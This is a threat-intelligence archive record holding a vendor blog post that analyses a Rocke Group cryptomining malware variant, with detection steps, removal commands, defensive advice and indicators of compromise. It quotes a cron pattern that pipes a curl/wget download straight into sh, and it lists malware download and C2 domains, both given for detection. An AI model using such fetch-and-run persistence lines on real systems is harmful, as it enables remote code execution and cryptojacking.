{
    "id": "c81873c1-8fbe-4e82-b8e2-0cc1c0692438",
    "created_at": "2023-01-12T15:04:00.326153Z",
    "updated_at": "2025-03-27T02:13:50.353093Z",
    "deleted_at": null,
    "sha1_hash": "3418dd81fa8625f5538ea3f9f53f8194b50e4b17",
    "title": "2021-04-06 - Rocke Group Actively Targeting the Cloud- Wants Your SSH Keys",
    "authors": "",
    "file_creation_date": "2022-05-28T00:42:51Z",
    "file_modification_date": "2022-05-28T00:42:51Z",
    "file_size": 379834,
    "plain_text": "# Rocke Group Actively Targeting the Cloud: Wants Your SSH Keys\n\n**[intezer.com/blog/cloud-security/rocke-group-actively-targeting-the-cloud-wants-your-ssh-keys](https://www.intezer.com/blog/cloud-security/rocke-group-actively-targeting-the-cloud-wants-your-ssh-keys)**\n\nApril 6, 2021\n\n### Get Free Account\n\nJoin Now\n\n### Top Blogs\n\n**[How to Write YARA Rules That Minimize False Positives](https://www.intezer.com/blog/threat-hunting/yara-rules-minimize-false-positives/)**\n\nGenerate Advanced YARA Rules Based on Code Reuse Incorporating YARA into daily\nsecurity operations can... [Read more](https://www.intezer.com/blog/threat-hunting/yara-rules-minimize-false-positives/)\n\n**[How to Analyze Malicious PDF Files](https://www.intezer.com/blog/incident-response/analyze-malicious-pdf-files/)**\n\nPortable Document Format (PDF) files are cross-platform file format, supporting links,\nimages, and fonts. The... [Read more](https://www.intezer.com/blog/incident-response/analyze-malicious-pdf-files/)\n\n**[SOC Level Up: Introduction to Sigma Rules](https://www.intezer.com/blog/threat-hunting/intro-to-sigma-rules/)**\n\nSigma rules are catching on more and more for SOC teams, as a way to... [Read more](https://www.intezer.com/blog/threat-hunting/intro-to-sigma-rules/)\n\n\n-----\n\n## New Malware Variant Exploits Production Environment\n\nRocke Group is a Chinese-based threat actor most known for running cryptojacking malware\n[on Linux machines. The group has been active since 2018 and continues to evolve by](https://blog.talosintelligence.com/2018/08/rocke-champion-of-monero-miners.html)\nmodifying its tools and techniques to stay evasive. In 2019, we reported that Rocke Group\nwas [competing with Pacha Group for cryptomining positioning on Linux-based servers in the](https://www.intezer.com/blog/cloud-security/technical-analysis-cryptocurrency-mining-war-on-the-cloud/)\ncloud.\n\n[We have found a new malware variant developed by Rocke Group, that infects other](https://analyze.intezer.com/files/fe27d4a8a5f299b0b25d10816e98cef2852af6dc3541bf25a77960b1573ca61d)\nmachines in the network using saved SSH keys and weak passwords. It also exploits\nvulnerabilities in popular platforms and services such as Jenkins, Redis and ActiveMQ. Once\n[the victim is infected a Monero cryptominer is executed.](https://analyze.intezer.com/files/398e3608455dbea2cba8e9944d9b43cbb0982b48b2882fe54adf937a7a62d9e2/sub/d10bf427-6cc9-41cb-bfae-7e12268f6f9e)\n\nBelow we present our findings with instructions on how to check if your system has been\ncompromised, as well as how to protect your cloud environments against future Rocke\nGroup attacks.\n\n## Capabilities and Findings\n\nThe malware that is initially delivered to the victim’s server is packed with a modified\nUPX which can make it harder for some Endpoint Detection and Response (EDR) products\nto detect the malicious code. This threat contains a number of modules that are stored in a\ncompressed form inside the malware, and during the execution the payloads are extracted\nand executed.\n\nRocke Group uses a new script that downloads malware from a hosting server and executes\nit. The malware then uses public SSH keys, which are saved in a file called “known_hosts”\non the victim’s Linux machine, to infect other machines on the network.\n\nThe malware archives persistence using a scheduled task in crontab and bashrc files. It\ncreates a service that controls the execution of the malware and configures it to be executed\non startup. The payload of the service is extracted from within the Rocke Group sample.\n\nNext, the malware attempts to spread in the network by brute forcing SSH, Redis and\nJenkins with weak passwords. Then, it exploits vulnerabilities. For Jenkins it uses two\nvulnerabilities for executing code (CVE-2018-1000861, CVE-2019-1003000) and for\nActiveMQ it tries to do an arbitrary file writing (CVE-2016-3088).\n\nTo hide the activity of the malware, it implements an evasion technique that uses library\nhijacking. This way the information retrieved by system commands is altered in a way that\nhides resources used by the malware and its components. For instance, running the ‘top’\ncommand will not show the high CPU usage caused by the cryptomining malware.\n\n\n-----\n\nOne of the compressed modules is an XMRig Miner. Before the miner is executed the\ndropper kills any other process that uses more than 30% of the cloud server’s CPU, this way\nthe cryptominer will have all of the CPU for itself.\n\n## Detection and Response\n\nDetect if a machine in your system has been compromised by following all of these steps:\n\n1. The malware creates files in the following directories:\n\n/usr/local/sbin\n/usr/local/bin\n/usr/bin\n/usr/libexec\n/tmp\n\nCheck if there are suspicious files in these locations. This campaign is known for using\nsimilar names to valid Linux services and file names such as “kerberods”, so pay attention to\nthe files you see in these directories. In other cases, it uses file names like:\n6ff4ba5d0de4498. In addition, the malware changes the timestamps of files created during\nthe attack so that they appear older. You should not rely on the creation/modification time of\nthe files.\n**Response: Remove the malicious files**\n\n**[MITRE Technique: Masquerading (T1036)](https://attack.mitre.org/techniques/T1036/)**\n\nCheck if there is a service that listens on port 61131 for incoming connections. Use the\ncommand: netstat -tupln\n**Response: Find the PID of the process and kill it. Run the following command to get the**\nPID: netstat -ltnp | grep -w ‘:61131’ and then: sudo kill -9 <PID> to kill the process.\n\nCheck if you have a service called sshservice.service. You can do this by running:\n_systemctl status sshservice.service_\n**Response: Stop and remove the service by running these commands:**\nsystemctl stop [servicename]\n\nsystemctl disable [servicename]\n\nrm /etc/systemd/system/[servicename]\n\nrm /etc/systemd/system/[servicename]\n\nrm /usr/lib/systemd/system/[servicename]\n\nrm /usr/lib/systemd/system/[servicename]\n\nsystemctl daemon-reload systemctl reset-failed\n\n**[MITRE Technique: Create System Process (T1543) and Masquerading (T1036)](https://attack.mitre.org/techniques/T1543/002/)**\n\n\n-----\n\nCheck if the cron jobs include commands in the following format:\n_*/15 * * * * (curl -fsSL -m180 ||wget -q -T180 -O- )|sh Check the following location of_\nscheduled jobs:\n\n/var/spool/cron/root\n/var/spool/cron/crontabs/root\n/etc/cron.d/root\n\n**Response: Delete these commands from the crontab**\n**[MITRE Technique: Scheduled Task/Job (T1053)](https://attack.mitre.org/techniques/T1053/)**\n\nCheck that /etc/bashrc contains commands in the same format as the crontab files\n**Response: Delete the commands from the file**\n**[MITRE Technique: Event Triggered Execution using .bashrc file (T1546)](https://attack.mitre.org/techniques/T1546/004/)**\n\nThis campaign uses DNS over HTTPs (DoH) to obtain the address of the C2 server using\nhard-coded domains that send back an encrypted DNS record. Inspect your network traffic\nfor anomalies in HTTPs packages. Check if your machine tried to access one (or more) of\nthe following domains:\n\nUpdate.iap5u1rbety6vifaxsi9vovnc9jjay2l[.]com\ncloudflare-dns[.]com\n\n**[MITRE Technique: Protocol Tunneling (T1572) and Encrypted Channel (T1573)](https://attack.mitre.org/techniques/T1572/)**\n\nThe malware tries to infect other machines in the network by brute forcing weak\npasswords and exploiting vulnerabilities in Jenkins, Redis, SSH and ActiveMQ. Follow all of\nthe steps above for machines that have these services.\n**[MITRE Technique: Network Service Scanning (T1046)](https://attack.mitre.org/techniques/T1046/)**\nTTPs now available in Intezer Analyze. Speed up malware analysis with relevant insights to\nunderstand how malware behaves. Analyze and classify 50 files per month with our free\n[community edition.](http://analyze.intezer.com/)\n\n## Be Proactive\n\nUse strong passwords for SSH, Jenkins and Redis services. It is also highly\nrecommended to use TLS authentication.\nUse different passwords and authentication keys for each machine in the network.\nMake sure that your Jenkins and ActiveMQ services have the latest updates.\nRestrict access to services and machines, and give only the required permissions for\neach user.\nFilter network traffic to untrusted or known bad domains.\nApply detection of anomalies in the networks to detect suspicious communication that\ndigresses from the usual traffic.\n\n## Runtime Protection is a Must\n\n\n-----\n\nThis attack is sophisticated in that it implements evasion techniques making detection much\nharder. It also spreads to other services and machines on the network making it harder to\n[respond to. Runtime protection with Intezer Protect gives you immediate visibility over all](http://www.intezer.com/intezer-protect)\ncode running in your systems and alerts you whenever unauthorized code is executed. So, if\nRocke Group attacks an environment with Intezer Protect installed on it, the user would\nimmediately get an alert on all infected machines with the ability to terminate the malicious\nprocesses.\n\nWhile there are dozens of cloud attack vectors that threat actors can utilize, such as software\nvulnerabilities and misconfigurations, eventually all attackers must run code or commands in\nthe production environment to conduct any damage.\n\nConsider that it’s not realistic to be able to close all attack vectors. Not only does it take time\nto fix vulnerabilities, but there are always attack vectors that are practically impossible to\nprevent such as supply chain or unknown vulnerabilities. Recent attacks have shown that\nLinux cryptominers and other threats will find their way into the production environment no\nmatter how hard you work to reduce the attack surface. Runtime protection is a necessary\nlast line of defense as actors like Rocke Group remain active.\n\n## How Can Intezer Help?\n\nYou will be notified as soon as malicious or unauthorized code is executed. In this case,\nexecution of the script and the malware will trigger an alert. You can see the full process tree,\nknow exactly which malicious processes were created by the malware, and be able to stop\nthem. While the Rocke Group campaign uses advanced evasion techniques to hide the\nmalware and its resources, with Intezer Protect you will see all of the information and activity\nthat happens on your machine.\n\n\n-----\n\nThe way we detect threats is different from other solutions. Anomaly detection and\nbehavioral profiling can fail to detect advanced attacks designed to look “normal.” We detect\nthreat variants by recognizing even the slightest amount of malicious code reuse. This\ninnovation has proven to be the fastest to identify attacks in Linux and containerized\nenvironments.\n\nMost runtime solutions are based on behavioral profiling which generates high false positives\nand requires constant tweaking of rules and policies. Our core detection strategy is based on\ndetecting unauthorized code instead of a set of rules. The result is very few false positives,\nand contextualized alerts indicating only real attacks.\n\nWe inspect any new code running in memory and analyze it against our cyber immune\nsystem of trusted and malicious code. This allows us to inspect every change in memory to\nsee if it’s truly unrecognized or malicious code, or just a natural change such as a software\nupgrade. This analysis does not just give you a “good or bad” answer. It also provides a deep\nunderstanding about the threat, where it came from, and who is responsible, crucial for\nresponding smarter and faster to incidents.\n\nTry [Intezer Protect for free on up to 10 hosts.](https://protect.intezer.com/signup)\n\n## IoCs\n\n Dropper Script\n\nF947e69f9f8d113fb9fba3e795827110ee17feb310b54a7f7b6672a5386a3de2\n\n## Malware\n\nFe27d4a8a5f299b0b25d10816e98cef2852af6dc3541bf25a77960b1573ca61d\n\n## Mining Pool\n\nminexmr[.]com pool\n\n## XMRig Miner\n\n398e3608455dbea2cba8e9944d9b43cbb0982b48b2882fe54adf937a7a62d9e2\n\n## Domains Used to Download the Malware\n\nimg[.]sobot.com\n\ncdn[.]xiaoduoai.com\n\n\n-----\n\nhttps://user-images[.]githubusercontent.com\n\n## Domains Used for Resolving the C2 Address\n\nUpdate.iap5u1rbety6vifaxsi9vovnc9jjay2l[.]com\n\ncloudflare-dns[.]com\n\n## Thanks to Joakim Kennedy for contributing to this post.\n\n**Nicole Fishbein**\nNicole is a malware analyst and reverse engineer. Prior to Intezer she was an embedded\nresearcher in the Israel Defense Forces (IDF) Intelligence Corps.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-04-06 - Rocke Group Actively Targeting the Cloud- Wants Your SSH Keys.pdf"
    ],
    "report_names": [
        "2021-04-06 - Rocke Group Actively Targeting the Cloud- Wants Your SSH Keys.pdf"
    ],
    "threat_actors": [
        {
            "id": "7c053836-8f50-4d40-bc5c-7088967e1b57",
            "created_at": "2022-10-25T16:07:24.549525Z",
            "updated_at": "2025-03-27T02:02:10.278474Z",
            "deleted_at": null,
            "main_name": "Rocke",
            "aliases": [
                "Aged Libra",
                "Iron Group",
                "Rocke"
            ],
            "source_name": "ETDA:Rocke",
            "tools": [
                "Godlua",
                "Kerberods",
                "LSD",
                "Pro-Ocean",
                "Xbash"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "484c5fed-029e-4504-b75a-bbdbc9460595",
            "created_at": "2022-10-25T16:07:24.529893Z",
            "updated_at": "2025-03-27T02:02:10.273182Z",
            "deleted_at": null,
            "main_name": "Pacha Group",
            "aliases": [],
            "source_name": "ETDA:Pacha Group",
            "tools": [
                "Antd",
                "DDG",
                "GreedyAntd",
                "Korkerds",
                "XMRig"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "eb3f4e4d-2573-494d-9739-1be5141cf7b2",
            "created_at": "2022-10-25T16:07:24.471018Z",
            "updated_at": "2025-03-27T02:02:10.24394Z",
            "deleted_at": null,
            "main_name": "Cron",
            "aliases": [],
            "source_name": "ETDA:Cron",
            "tools": [
                "Catelites",
                "Catelites Bot",
                "CronBot",
                "TinyZBot"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "18bcbaa6-8e7b-43c4-9db7-8b0b315ee5a3",
            "created_at": "2023-01-06T13:46:39.024086Z",
            "updated_at": "2025-03-27T02:00:02.980081Z",
            "deleted_at": null,
            "main_name": "Pacha Group",
            "aliases": [],
            "source_name": "MISPGALAXY:Pacha Group",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "905eabd9-2b7f-483d-86bd-0c72f96b4162",
            "created_at": "2023-01-06T13:46:39.02749Z",
            "updated_at": "2025-03-27T02:00:02.980813Z",
            "deleted_at": null,
            "main_name": "Rocke",
            "aliases": [
                "Aged Libra"
            ],
            "source_name": "MISPGALAXY:Rocke",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "0b02af5f-2027-42b7-a6f2-51e2fd49ba7f",
            "created_at": "2022-10-25T15:50:23.360509Z",
            "updated_at": "2025-03-27T02:00:55.45329Z",
            "deleted_at": null,
            "main_name": "Rocke",
            "aliases": [
                "Rocke"
            ],
            "source_name": "MITRE:Rocke",
            "tools": null,
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535840,
    "ts_updated_at": 1743041630,
    "ts_creation_date": 1653698571,
    "ts_modification_date": 1653698571,
    "files": {
        "pdf": "https://archive.orkl.eu/3418dd81fa8625f5538ea3f9f53f8194b50e4b17.pdf",
        "text": "https://archive.orkl.eu/3418dd81fa8625f5538ea3f9f53f8194b50e4b17.txt",
        "img": "https://archive.orkl.eu/3418dd81fa8625f5538ea3f9f53f8194b50e4b17.jpg"
    }
}